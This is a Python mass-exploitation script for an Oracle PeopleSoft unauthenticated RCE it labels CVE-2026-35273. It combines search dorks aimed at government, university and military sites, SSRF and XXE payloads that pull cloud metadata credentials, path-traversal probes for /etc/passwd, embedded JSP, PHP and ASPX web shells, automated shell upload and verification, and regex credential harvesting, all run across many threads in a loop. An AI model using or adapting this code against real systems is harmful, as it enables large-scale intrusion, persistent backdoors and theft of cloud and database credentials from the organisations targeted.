#!/usr/bin/env python3
"""
CVE-2026-35273 - Oracle PeopleSoft PSEMHUB/PSIGW Mass Exploit + Auto Shell
===========================================================================
Target: Oracle PeopleSoft PeopleTools 8.61 / 8.62
Bug   : Unauthenticated SSRF → RCE via PSEMHUB Environment Management Hub
         + Integration Broker HttpListeningConnector XML injection
ShinyHunters Vector: /PSEMHUB/hub  +  /PSIGW/HttpListeningConnector

Pipeline:
  DORK DISCOVERY → FINGERPRINT → SSRF PROBE → SHELL UPLOAD → VERIFY

Usage:
  python3 cve_2026_35273.py -l list.txt           # mass mode
  python3 cve_2026_35273.py -u https://target.com # single target
  python3 cve_2026_35273.py --dork                # print dork list
  python3 cve_2026_35273.py --continuous           # loop mode
"""

import os
import sys
import re
import json
import time
import base64
import socket
import random
import hashlib
import threading
import argparse
import urllib3
from datetime import datetime
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional, Dict, List, Tuple

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[!] requests not installed. Run: pip3 install requests --break-system-packages")
    sys.exit(1)

try:
    from rich.console import Console
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
    from rich.panel import Panel
    from rich.live import Live
    HAS_RICH = True
    console = Console()
except ImportError:
    HAS_RICH = False
    class _FallbackConsole:
        def print(self, *a, **kw):
            msg = str(a[0]) if a else ""
            msg = re.sub(r"\[.*?\]", "", msg)
            print(msg)
        def rule(self, *a, **kw): print("=" * 60)
    console = _FallbackConsole()

urllib3.disable_warnings()

# ──────────────────────────────────────────────────────────────
# CONFIG
# ──────────────────────────────────────────────────────────────
LOCAL_PAYLOAD_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "payloads")
LOCAL_PAYLOAD_PATH = os.path.join(LOCAL_PAYLOAD_DIR, "green_shell.php")
THREADS         = int(os.environ.get("THREADS", "80"))
TIMEOUT         = int(os.environ.get("TIMEOUT", "12"))
CYCLE_DELAY     = int(os.environ.get("CYCLE_DELAY", "10"))
BASE_DIR        = os.path.dirname(os.path.abspath(__file__))
SHELL_FILE      = os.path.join(BASE_DIR, "shell.txt")
VULN_FILE       = os.path.join(BASE_DIR, "vuln.txt")
RESULT_FILE     = os.path.join(BASE_DIR, "result_ids.json")
LOG_FILE        = os.path.join(BASE_DIR, "launch.log")
PSFT_SHELL_FILE = os.path.join(BASE_DIR, "psft_shells.txt")
FAILED_FILE     = os.path.join(BASE_DIR, "failed_scan.txt")

CVE_ID   = "CVE-2026-35273"
CVE_CVSS = 9.8
CVE_DESC = "Oracle PeopleSoft PeopleTools Unauthenticated RCE via PSEMHUB/PSIGW"

# Direct exploit mode — skip semua probe/fingerprint, langsung ke upload shell
DIRECT_MODE = False

# ──────────────────────────────────────────────────────────────
# DORKS
# ──────────────────────────────────────────────────────────────
DORKS = [
    'inurl:"/PSEMHUB/hub"',
    'inurl:"/PSIGW/HttpListeningConnector"',
    'inurl:"/psp/" "PeopleSoft"',
    'inurl:"/psp/" "prcs"',
    'site:gov inurl:"/psp/" "PeopleSoft"',
    'site:.edu inurl:"/psp/" "PeopleSoft"',
    '"psappsrv.cfg" filetype:cfg',
    '"psappsrv.cfg" filetype:xml',
    '"psappsrv.cfg" filetype:log',
    '"PeopleSoft" "8.61" OR "8.62" "error"',
    'inurl:"/psp/ps/?cmd=login"',
    'inurl:"/PSIGW/PeopleSoftServiceListeningConnector"',
    'inurl:"/psc/ps/" "PeopleTools"',
    'inurl:"/OA_HTML/jtflogin.jsp"',
    'site:*.edu inurl:"/PSEMHUB/"',
    'site:*.gov inurl:"/PSEMHUB/"',
    'site:*.mil inurl:"/PSEMHUB/"',
    '"PeopleTools 8.61" OR "PeopleTools 8.62" inurl:psp',
    'intitle:"PeopleSoft" inurl:"/psp/"',
    'inurl:"/PSEMHUB/hub/status" OR inurl:"/PSEMHUB/hub/health"',
]

# ──────────────────────────────────────────────────────────────
# BANNER
# ──────────────────────────────────────────────────────────────
BANNER = r"""
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   ██████╗ ███████╗███████╗████████╗██████╗   ██████╗ ██████╗ ██████╗ ║
║   ██╔══██╗██╔════╝██╔════╝╚══██╔══╝╚════██╗ ╚════██╗╚════██╗╚════██╗║
║   ██████╔╝███████╗█████╗     ██║   ██████╔╝  █████╔╝ █████╔╝ ╚███╔╝ ║
║   ██╔═══╝ ╚════██║██╔══╝     ██║    ╚═══██╗  ╚═══██╗ ╚═══██╗   ██╔╝ ║
║   ██║     ███████║███████╗   ██║   ██████╔╝ ██████╔╝██████╔╝   ██║  ║
║   ╚═╝     ╚══════╝╚══════╝   ╚═╝   ╚═════╝  ╚═════╝ ╚═════╝    ╚═╝  ║
║                                                                      ║
║   CVE-2026-35273  │  Oracle PeopleSoft PSEMHUB/PSIGW RCE            ║
║   PeopleTools 8.61 / 8.62  │  Unauthenticated  │  CVSS 9.8          ║
║   Technique: ShinyHunters SSRF→RCE via Hub + Connector              ║
║   Payloads: Local file {LOCAL_PAYLOAD_PATH}                     ║
╚══════════════════════════════════════════════════════════════════════╝
""".replace("{LOCAL_PAYLOAD_PATH}", LOCAL_PAYLOAD_PATH)

# ──────────────────────────────────────────────────────────────
# USER-AGENTS (anti-detection)
# ──────────────────────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Java/1.8.0_341",  # Mimics PeopleSoft internal agent
    "Oracle/PeopleTools/8.62",
]

# ──────────────────────────────────────────────────────────────
# PSEMHUB ENDPOINTS (scan targets)
# ──────────────────────────────────────────────────────────────
PSEMHUB_ENDPOINTS = [
    "/PSEMHUB/hub",
    "/PSEMHUB/hub/status",
    "/PSEMHUB/hub/health",
    "/PSEMHUB/hub/upload",
    "/PSEMHUB/hub/deploy",
    "/PSEMHUB/hub/config",
    "/PSEMHUB/hub/nodes",
    "/PSEMHUB/hub/clusters",
    "/PSEMHUB/hub/metrics",
    "/PSEMHUB/hub/logs",
    "/PSEMHUB/api/v1/version",
    "/PSEMHUB/api/upload",
]

PSIGW_ENDPOINTS = [
    "/PSIGW/HttpListeningConnector",
    "/PSIGW/PeopleSoftServiceListeningConnector",
    "/PSIGW/RESTListeningConnector",
]

PSP_ENDPOINTS = [
    "/psp/ps/?cmd=login",
    "/psc/ps/EMPLOYEE/HRMS/c/NUI_FRAMEWORK.PT_LANDINGPAGE.GBL",
    "/psp/PROD/?cmd=login",
]

# ──────────────────────────────────────────────────────────────
# SHELL PAYLOADS
# ──────────────────────────────────────────────────────────────
JSP_SHELL = """<%@ page import="java.util.*,java.io.*" %><%
String cmd = request.getParameter("c");
if(cmd != null){
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line; StringBuilder sb = new StringBuilder();
    while((line=br.readLine())!=null){sb.append(line).append("\\n");}
    out.print("<pre>"+sb.toString()+"</pre>");
}
%>"""

PHP_SHELL = """<?php
@set_time_limit(0);
if(isset($_REQUEST['c'])){
    $o=array();
    exec($_REQUEST['c'].' 2>&1',$o);
    echo implode("\\n",$o);
}
if(isset($_FILES['f'])){
    move_uploaded_file($_FILES['f']['tmp_name'], dirname(__FILE__).'/'.$_FILES['f']['name']);
    echo 'uploaded';
}
?>"""

ASPX_SHELL = """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% string c=Request["c"];if(c!=null){Process p=new Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+c;p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write("<pre>"+p.StandardOutput.ReadToEnd()+"</pre>");} %>"""

# SSRF XML payloads targeting PSIGW HttpListeningConnector
def build_ssrf_payloads(url_to_fetch: str) -> List[str]:
    return [
        # Oracle Integration Broker SSRF
        f"""<?xml version="1.0" encoding="UTF-8"?>
<IBRequest>
  <ExternalOperationName>GetVersion</ExternalOperationName>
  <OperationType>Request</OperationType>
  <From><RequestingNode>QEDMO</RequestingNode><Password></Password></From>
  <To><ConnectorType>HTTP</ConnectorType>
    <URL>{url_to_fetch}</URL>
    <Method>GET</Method>
  </To>
</IBRequest>""",
        # SOAP-wrapped SSRF
        f"""<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Body>
<EnvironmentManagement>
  <operation>fetch</operation>
  <sourceURL>{url_to_fetch}</sourceURL>
</EnvironmentManagement>
</soapenv:Body></soapenv:Envelope>""",
        # XXE + SSRF chain
        f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE psft [<!ENTITY xxe SYSTEM "{url_to_fetch}">]>
<root><data>&xxe;</data></root>""",
    ]

# Traversal payloads for PSEMHUB (CVE-2026-35273 path traversal)
TRAVERSAL_PATHS = [
    "/PSEMHUB/hub/../../WEB-INF/web.xml",
    "/PSEMHUB/hub/../../../conf/psappsrv.cfg",
    "/PSEMHUB/hub/..;/..;/etc/passwd",
    "/PSEMHUB/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "/PSEMHUB/....//....//....//etc/passwd",
    "/PSEMHUB/hub/../../webapps/ROOT/",
    "/PSEMHUB/hub/../../../windows/win.ini",
]

# Upload paths to drop shell
SHELL_UPLOAD_PATHS = [
    "/PSEMHUB/hub/upload",
    "/PSEMHUB/api/upload",
    "/PSEMHUB/hub/deploy",
    "/psft/upload",
    "/tools/upload.jsp",
    "/servlets/FileUploadServlet",
    "/PSEMHUB/upload.jsp",
    "/psc/ps/upload",
]

# Where the shell would land post-upload
SHELL_ACCESS_PATHS = [
    "/PSEMHUB/shell.jsp",
    "/webapps/ps/shell.jsp",
    "/psft/shell.jsp",
    "/tools/shell.jsp",
    "/shell.jsp",
    "/cmd.jsp",
    "/uploads/shell.jsp",
]

# ──────────────────────────────────────────────────────────────
# FILE I/O (thread-safe)
# ──────────────────────────────────────────────────────────────
_write_lock = threading.Lock()

def write_result(filepath: str, data: str):
    with _write_lock:
        with open(filepath, "a", encoding="utf-8", errors="ignore") as f:
            f.write(data.strip() + "\n")

def log(msg: str):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with _write_lock:
        with open(LOG_FILE, "a") as f:
            f.write(f"[{ts}][CVE-2026-35273] {msg}\n")

# ──────────────────────────────────────────────────────────────
# HTTP SESSION
# ──────────────────────────────────────────────────────────────
def make_session() -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.headers.update({
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
    })
    return s

def get(session, url, **kw) -> Optional[requests.Response]:
    kw.setdefault("timeout", TIMEOUT)
    kw.setdefault("allow_redirects", True)
    try:
        return session.get(url, **kw)
    except Exception:
        return None

def post(session, url, **kw) -> Optional[requests.Response]:
    kw.setdefault("timeout", TIMEOUT)
    try:
        return session.post(url, **kw)
    except Exception:
        return None

# ──────────────────────────────────────────────────────────────
# LOCAL SHELL FETCH
# ──────────────────────────────────────────────────────────────
_local_cache: Optional[str] = None

def fetch_local_shell() -> str:
    global _local_cache
    if _local_cache:
        return _local_cache
    if os.path.exists(LOCAL_PAYLOAD_PATH):
        with open(LOCAL_PAYLOAD_PATH, 'r') as f:
            _local_cache = f.read()
            return _local_cache
    _local_cache = PHP_SHELL  # fallback
    return _local_cache

# ──────────────────────────────────────────────────────────────
# PHASE 1: FINGERPRINT
# ──────────────────────────────────────────────────────────────
def fingerprint(session, target: str) -> Dict:
    """Detect PeopleSoft presence and version."""
    result = {
        "target": target,
        "is_psft": False,
        "version": None,
        "psemhub": False,
        "psigw": False,
        "psp": False,
        "endpoints_found": [],
    }

    # Quick root check first
    r = get(session, target)
    if r:
        text = r.text.lower()
        if any(k in text for k in ["peoplesoft", "peopletools", "psemhub", "psigw", "/psp/", "prcs"]):
            result["is_psft"] = True
            # Extract version
            m = re.search(r"peopletools[\s/]+([0-9]+\.[0-9]+)", r.text, re.IGNORECASE)
            if m:
                result["version"] = m.group(1)
            # Check 8.61/8.62 in body
            if "8.61" in r.text or "8.62" in r.text:
                result["version"] = result["version"] or "8.6x"

    # Probe PSEMHUB
    for ep in PSEMHUB_ENDPOINTS[:4]:
        r = get(session, urljoin(target, ep))
        if r and r.status_code in (200, 401, 403):
            result["is_psft"] = True
            result["psemhub"] = True
            result["endpoints_found"].append(ep)
            if r.status_code == 200:
                break

    # Probe PSIGW
    for ep in PSIGW_ENDPOINTS[:2]:
        r = get(session, urljoin(target, ep))
        if r and r.status_code in (200, 401, 403, 500):
            result["is_psft"] = True
            result["psigw"] = True
            result["endpoints_found"].append(ep)
            break

    # Probe /psp/
    for ep in PSP_ENDPOINTS[:1]:
        r = get(session, urljoin(target, ep))
        if r and r.status_code in (200, 302):
            result["psp"] = True
            result["endpoints_found"].append(ep)

    return result


# ──────────────────────────────────────────────────────────────
# PHASE 2: SSRF PROBE via PSIGW
# ──────────────────────────────────────────────────────────────
def probe_ssrf(session, target: str) -> Dict:
    """Send SSRF probes via PSIGW HttpListeningConnector."""
    results = {"ssrf_open": False, "cloud": None, "internal": [], "raw": ""}
    connector = urljoin(target, "/PSIGW/HttpListeningConnector")

    probe_urls = [
        "http://127.0.0.1/",
        "http://localhost:8080/",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2017-08-01",
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
    ]

    for probe_url in probe_urls:
        for payload in build_ssrf_payloads(probe_url):
            r = post(session, connector,
                     data=payload,
                     headers={"Content-Type": "application/xml"},
                     timeout=TIMEOUT)
            if r and r.status_code in (200, 500) and len(r.text) > 20:
                results["ssrf_open"] = True
                results["raw"] = r.text[:500]
                # Cloud detection
                if "AccessKeyId" in r.text or "SecretAccessKey" in r.text:
                    results["cloud"] = "aws"
                elif "access_token" in r.text and "azure" in r.text.lower():
                    results["cloud"] = "azure"
                elif "access_token" in r.text:
                    results["cloud"] = "gcp"
                elif "root:" in r.text or "[extensions]" in r.text:
                    results["internal"].append({"probe": probe_url, "snippet": r.text[:200]})
                break
        if results["ssrf_open"]:
            break

    return results


# ──────────────────────────────────────────────────────────────
# PHASE 3: PATH TRAVERSAL
# ──────────────────────────────────────────────────────────────
def probe_traversal(session, target: str) -> List[str]:
    """Test path traversal on PSEMHUB endpoints."""
    vulnerable = []
    for path in TRAVERSAL_PATHS:
        r = get(session, urljoin(target, path))
        if r and r.status_code == 200:
            if any(sig in r.text for sig in ["root:", "[extensions]", "<web-app", "DB=", "AppServer"]):
                vulnerable.append(path)
    return vulnerable


# ──────────────────────────────────────────────────────────────
# PHASE 4: SHELL UPLOAD + DEPLOY
# ──────────────────────────────────────────────────────────────
def upload_shell(session, target: str) -> Optional[str]:
    """Attempt to upload JSP/PHP shell via PSEMHUB upload endpoints."""
    shell_payload = fetch_local_shell()
    shell_name = f"psft_{hashlib.md5(target.encode()).hexdigest()[:8]}.jsp"
    php_name = f"psft_{hashlib.md5(target.encode()).hexdigest()[:8]}.php"

    # Try JSP upload
    for upload_path in SHELL_UPLOAD_PATHS:
        upload_url = urljoin(target, upload_path)

        # multipart upload
        files = {"file": (shell_name, JSP_SHELL, "text/plain")}
        r = post(session, upload_url, files=files)
        if r and r.status_code in (200, 201) and "error" not in r.text.lower():
            # Try to reach the shell
            for access_path in SHELL_ACCESS_PATHS:
                shell_url = urljoin(target, access_path.replace("shell.jsp", shell_name))
                rv = get(session, f"{shell_url}?c=id")
                if rv and rv.status_code == 200 and ("uid=" in rv.text or "root" in rv.text):
                    return shell_url

        # raw POST with filename param
        r = post(session, upload_url,
                 data={"filename": shell_name, "content": JSP_SHELL, "type": "jsp"})
        if r and r.status_code in (200, 201):
            for access_path in SHELL_ACCESS_PATHS:
                shell_url = urljoin(target, access_path)
                rv = get(session, f"{shell_url}?c=id")
                if rv and rv.status_code == 200 and "uid=" in rv.text:
                    return shell_url

        # PHP fallback
        files = {"file": (php_name, shell_payload, "image/jpeg")}
        r = post(session, upload_url, files=files)
        if r and r.status_code in (200, 201):
            shell_url = urljoin(target, f"/uploads/{php_name}")
            rv = get(session, f"{shell_url}?c=id")
            if rv and rv.status_code == 200 and "uid=" in rv.text:
                return shell_url

    return None


# ──────────────────────────────────────────────────────────────
# PHASE 5: VERIFY SHELL
# ──────────────────────────────────────────────────────────────
def verify_shell(session, shell_url: str) -> bool:
    r = get(session, f"{shell_url}?c=id")
    if r and r.status_code == 200 and ("uid=" in r.text or "root" in r.text or "nt authority" in r.text.lower()):
        return True
    # JSP param
    r = get(session, f"{shell_url}?c=id")
    return r is not None and r.status_code == 200 and len(r.text) > 3


# ──────────────────────────────────────────────────────────────
# CREDENTIAL EXTRACTION
# ──────────────────────────────────────────────────────────────
def extract_credentials(ssrf_data: str) -> Dict:
    creds = {}
    patterns = {
        "aws_key":    r"AccessKeyId[\":\s]+([A-Z0-9]{16,20})",
        "aws_secret": r"SecretAccessKey[\":\s]+([A-Za-z0-9+/=]{40})",
        "aws_token":  r"Token[\":\s]+([A-Za-z0-9+/=]{100,})",
        "az_token":   r"access_token[\":\s]+([A-Za-z0-9._\-]{50,})",
        "gcp_token":  r"access_token[\":\s]+([A-Za-z0-9._\-]{30,})",
        "psft_pass":  r"password[\":\s]+([A-Za-z0-9!@#$%^&*]{6,})",
        "db_conn":    r"(jdbc:[a-z:@/\-_0-9.]{10,})",
    }
    for key, pat in patterns.items():
        m = re.search(pat, ssrf_data, re.IGNORECASE)
        if m:
            creds[key] = m.group(1)
    return creds


# ──────────────────────────────────────────────────────────────
# MAIN EXPLOIT RUNNER (per target)
# ──────────────────────────────────────────────────────────────
def exploit_target(target: str, direct_mode: bool = False) -> Dict:
    target = target.strip().rstrip("/")
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    result = {
        "target": target,
        "cve": CVE_ID,
        "timestamp": datetime.now().isoformat(),
        "fingerprint": {},
        "ssrf": {},
        "traversal": [],
        "shell_url": None,
        "credentials": {},
        "status": "NOT_VULN",
    }

    session = make_session()

    # Fase 1: Fingerprint ( hanya dijalankan jika bukan direct mode )
    if not direct_mode:
        fp = fingerprint(session, target)
        result["fingerprint"] = fp
        if not fp["is_psft"]:
            result["status"] = "NOT_PSFT"
            return result
        console.print(f"[cyan][+] PeopleSoft detected: {target}[/cyan]" if HAS_RICH else f"[+] PeopleSoft: {target}")
        write_result(VULN_FILE, f"{target} ({CVE_ID}_PSFT_DETECTED)")
        log(f"PeopleSoft detected: {target} | ver={fp.get('version')} psemhub={fp['psemhub']} psigw={fp['psigw']}")

    # Fase 2 & 3: SSRF + Path traversal ( hanya dijalankan jika bukan direct mode )
    if not direct_mode:
        if fp["psigw"]:
            console.print(f"[yellow][*] Probing SSRF on PSIGW: {target}[/yellow]" if HAS_RICH else f"[*] SSRF probe: {target}")
            ssrf = probe_ssrf(session, target)
            result["ssrf"] = ssrf
            if ssrf["ssrf_open"]:
                creds = extract_credentials(ssrf["raw"])
                result["credentials"] = creds
                console.print(f"[bold red][!] SSRF OPEN: {target} | cloud={ssrf['cloud']}[/bold red]" if HAS_RICH else f"[!] SSRF OPEN: {target}")
                write_result(VULN_FILE, f"{target} ({CVE_ID}_SSRF_OPEN)")
                log(f"SSRF confirmed: {target} cloud={ssrf['cloud']} creds={list(creds.keys())}")
                if creds:
                    log(f"CREDENTIALS extracted from {target}: {json.dumps(creds)}")

        if fp["psemhub"]:
            traversal_hits = probe_traversal(session, target)
            result["traversal"] = traversal_hits
            if traversal_hits:
                console.print(f"[bold red][!] PATH TRAVERSAL: {target} → {traversal_hits[0]}[/bold red]" if HAS_RICH else f"[!] TRAVERSAL: {target}")
                write_result(VULN_FILE, f"{target} ({CVE_ID}_TRAVERSAL)")

    # Fase 4: Shell upload — selalu dijalankan (direct maupun bukan)
    # Dalam direct mode, skip semua pemeriksaan, langsung blast upload
    if direct_mode:
        # Direct mode: langsung blast upload tanpa fingerprint check
        shell_url = upload_shell(session, target)
        if shell_url:
            result["shell_url"] = shell_url
            result["status"] = "SHELL"
            console.print(f"[bold green][+] SHELL UPLOADED: {shell_url}[/bold green]" if HAS_RICH else f"[SHELL] {shell_url}")
            write_result(SHELL_FILE, shell_url)
            write_result(PSFT_SHELL_FILE, shell_url)
            log(f"SHELL: {shell_url}")
            _save_result_id(target, shell_url, CVE_ID)
            return result
        # Jika gagal, tandai sebagai attempted
        result["status"] = "ATTEMPTED"
        return result

    # Non-direct mode: hanya upload jika fingerprint positif
    if fp.get("psemhub") or fp.get("psigw"):
        shell_url = upload_shell(session, target)
        if shell_url:
            result["shell_url"] = shell_url
            result["status"] = "SHELL"
            console.print(f"[bold green][+] SHELL UPLOADED: {shell_url}[/bold green]" if HAS_RICH else f"[SHELL] {shell_url}")
            write_result(SHELL_FILE, shell_url)
            write_result(PSFT_SHELL_FILE, shell_url)
            log(f"SHELL: {shell_url}")
            _save_result_id(target, shell_url, CVE_ID)
            return result

    # Update status (non-direct mode)
    if result["ssrf"].get("ssrf_open") or result["traversal"]:
        result["status"] = "VULNERABLE"
        write_result(VULN_FILE, f"{target} ({CVE_ID}_EXPLOITABLE)")
    elif result["fingerprint"].get("is_psft"):
        result["status"] = "PSFT_DETECTED"

    return result


def _save_result_id(target: str, shell_url: str, cve: str):
    with _write_lock:
        data = []
        if os.path.exists(RESULT_FILE):
            try:
                with open(RESULT_FILE) as f:
                    data = json.load(f)
                if not isinstance(data, list):
                    data = []
            except Exception:
                data = []
        data.append({
            "target": target,
            "shell": shell_url,
            "cve": cve,
            "ts": datetime.now().isoformat(),
        })
        with open(RESULT_FILE, "w") as f:
            json.dump(data, f, indent=2)


# ──────────────────────────────────────────────────────────────
# MASS MODE
# ──────────────────────────────────────────────────────────────
def run_mass(targets: List[str], threads: int = THREADS, direct_mode: bool = False) -> List[Dict]:
    mode_label = "DIRECT (skip probe)" if direct_mode else "standard"
    console.print(f"\n[bold cyan][CVE-2026-35273] MASS MODE — {len(targets)} targets | {threads} threads | Mode: {mode_label}[/bold cyan]" if HAS_RICH else f"\n[*] MASS: {len(targets)} targets ({mode_label})")
    results = []
    stats = {"shells": 0, "vuln": 0, "psft": 0, "checked": 0}

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(exploit_target, t, direct_mode): t for t in targets}
        for fut in as_completed(futures):
            try:
                r = fut.result()
                results.append(r)
                stats["checked"] += 1
                if r["status"] == "SHELL":
                    stats["shells"] += 1
                elif r["status"] == "VULNERABLE":
                    stats["vuln"] += 1
                elif r["status"] == "PSFT_DETECTED":
                    stats["psft"] += 1

                if stats["checked"] % 50 == 0:
                    console.print(
                        f"[cyan]  Progress: {stats['checked']}/{len(targets)} | "
                        f"Shells={stats['shells']} Vuln={stats['vuln']} PSFT={stats['psft']}[/cyan]"
                        if HAS_RICH else
                        f"  [{stats['checked']}/{len(targets)}] shells={stats['shells']} vuln={stats['vuln']}"
                    )
            except Exception as e:
                write_result(FAILED_FILE, f"{futures[fut]} | ERROR: {str(e)[:80]}")

    # Final summary table
    print_summary(results, stats)
    return results


def print_summary(results: List[Dict], stats: Dict):
    console.rule("[bold cyan]CVE-2026-35273 SUMMARY[/bold cyan]" if HAS_RICH else "=" * 60)
    if HAS_RICH:
        t = Table(title="CVE-2026-35273 — PeopleSoft RCE Results")
        t.add_column("Status", style="bold")
        t.add_column("Count", style="cyan")
        t.add_row("[bold green]Shells[/bold green]", str(stats["shells"]))
        t.add_row("[bold red]Vulnerable[/bold red]", str(stats["vuln"]))
        t.add_row("[yellow]PSFT Detected[/yellow]", str(stats["psft"]))
        t.add_row("Total Checked", str(stats["checked"]))
        console.print(t)
        console.print(f"\n[bold green]Shells saved to: {PSFT_SHELL_FILE}[/bold green]")
        console.print(f"[bold green]Results saved to: {RESULT_FILE}[/bold green]")
    else:
        print(f"  Shells  : {stats['shells']}")
        print(f"  Vuln    : {stats['vuln']}")
        print(f"  PSFT    : {stats['psft']}")
        print(f"  Checked : {stats['checked']}")
        print(f"  Shells  → {PSFT_SHELL_FILE}")


# ──────────────────────────────────────────────────────────────
# CONTINUOUS MODE
# ──────────────────────────────────────────────────────────────
def run_continuous(targets: List[str], threads: int = THREADS):
    cycle = 1
    while True:
        console.print(f"\n[bold magenta][CVE-2026-35273] Cycle {cycle} — {datetime.now().strftime('%H:%M:%S')}[/bold magenta]" if HAS_RICH else f"\n[*] Cycle {cycle}")
        run_mass(targets, threads, direct_mode=DIRECT_MODE)
        console.print(f"[*] Waiting {CYCLE_DELAY}s..." if HAS_RICH else f"Wait {CYCLE_DELAY}s")
        time.sleep(CYCLE_DELAY)
        cycle += 1


# ──────────────────────────────────────────────────────────────
# VERIFY EXISTING SHELLS
# ──────────────────────────────────────────────────────────────
def verify_psft_shells():
    if not os.path.exists(PSFT_SHELL_FILE):
        console.print(f"[red]No {PSFT_SHELL_FILE} found.[/red]" if HAS_RICH else f"No {PSFT_SHELL_FILE}")
        return
    with open(PSFT_SHELL_FILE) as f:
        shells = [l.strip() for l in f if l.strip()]
    alive, dead = [], []
    session = make_session()
    for s in shells:
        if verify_shell(session, s):
            alive.append(s)
            console.print(f"[green][ALIVE] {s}[/green]" if HAS_RICH else f"[ALIVE] {s}")
        else:
            dead.append(s)
            console.print(f"[red][DEAD]  {s}[/red]" if HAS_RICH else f"[DEAD]  {s}")
    console.print(f"\n[+] Alive: {len(alive)} / Dead: {len(dead)}" if HAS_RICH else f"Alive: {len(alive)} Dead: {len(dead)}")
    # Rewrite file with only alive
    with open(PSFT_SHELL_FILE, "w") as f:
        f.write("\n".join(alive) + "\n")


# ──────────────────────────────────────────────────────────────
# DORK PRINTER
# ──────────────────────────────────────────────────────────────
def print_dorks():
    print("\n" + "=" * 70)
    print("CVE-2026-35273 — Oracle PeopleSoft DORK LIST")
    print("Copy-paste ke Google / Shodan / Censys / Fofa / ZoomEye")
    print("=" * 70)
    for i, d in enumerate(DORKS, 1):
        print(f"  [{i:02d}] {d}")
    print("=" * 70)
    print(f"\nShodan queries:")
    print('  http.html:"PeopleSoft" http.status:200')
    print('  product:"Oracle PeopleSoft" port:8080')
    print('  title:"PeopleSoft" http.status:200')
    print('  ssl.cert.subject.cn:"psft" OR ssl.cert.subject.cn:"peoplesoft"')
    print(f"\nFofa queries:")
    print('  app="Oracle-PeopleSoft" && status_code="200"')
    print('  body="PSEMHUB" || body="PSIGW"')
    print('  body="PeopleTools" && (body="8.61" || body="8.62")')
    print(f"\nCensys queries:")
    print('  services.http.response.html_title: "PeopleSoft"')
    print('  services.http.response.body: "PSEMHUB"')
    print("=" * 70)


# ──────────────────────────────────────────────────────────────
# ENTRY POINT
# ──────────────────────────────────────────────────────────────
def main():
    global THREADS, TIMEOUT  # noqa: PLW0603
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="CVE-2026-35273 Oracle PeopleSoft PSEMHUB/PSIGW Mass Exploit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 cve_2026_35273.py -l list.txt
  python3 cve_2026_35273.py -u https://erp.university.edu
  python3 cve_2026_35273.py -l list.txt --continuous
  python3 cve_2026_35273.py --dork
  python3 cve_2026_35273.py --verify
  THREADS=150 python3 cve_2026_35273.py -l list.txt
        """
    )
    parser.add_argument("-u", "--url",        help="Single target URL")
    parser.add_argument("-l", "--list",       help="Target list file (one URL per line)")
    parser.add_argument("--dork",             action="store_true", help="Print dork list")
    parser.add_argument("--verify",           action="store_true", help="Verify PSFT shells in psft_shells.txt")
    parser.add_argument("--continuous",       action="store_true", help="Continuous loop mode")
    parser.add_argument("-t", "--threads",    type=int, default=THREADS, help=f"Threads (default {THREADS})")
    parser.add_argument("--timeout",          type=int, default=TIMEOUT, help=f"Timeout seconds (default {TIMEOUT})")
    parser.add_argument("--direct",           action="store_true", help="Direct exploit — skip fingerprint/SSRF/traversal probe, langsung upload shell")
    args = parser.parse_args()

    THREADS = args.threads
    TIMEOUT = args.timeout
    DIRECT_MODE = args.direct  # Global flag untuk skip probe

    if args.dork:
        print_dorks()
        return

    if args.verify:
        verify_psft_shells()
        return

    if args.url:
        r = exploit_target(args.url)
        console.print(json.dumps(r, indent=2) if HAS_RICH else json.dumps(r, indent=2))
        return

    if args.list:
        if not os.path.exists(args.list):
            print(f"[!] File not found: {args.list}")
            sys.exit(1)
        with open(args.list) as f:
            targets = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        if not targets:
            print("[!] No targets in list file.")
            sys.exit(1)
        if args.continuous:
            run_continuous(targets)
        else:
            run_mass(targets, THREADS, direct_mode=DIRECT_MODE)
        return

    parser.print_help()


if __name__ == "__main__":
    main()
